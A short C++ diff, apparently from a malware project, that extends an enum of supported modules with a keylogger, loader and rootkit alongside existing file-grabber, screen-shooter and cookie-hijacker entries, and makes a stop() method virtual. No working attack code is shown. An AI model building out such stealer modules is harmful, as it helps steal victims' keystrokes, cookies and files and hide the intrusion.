@@ -20,6 +20,9 @@ typedef enum SupportedModules {
         FILE_GRABBER=0,
         SCREEN_SHOOTER,
         COOKIE_HIJACKER,
+        KEY_LOGGER,
+        LOADER,
+        ROOTKIT,
         NUM_OF_MODULES
     } supported_modules_enum;
 
@@ -125,7 +128,7 @@ public:
         }
     }
     
-    void stop()
+    virtual void stop()
     {
         run_ = false;
     }
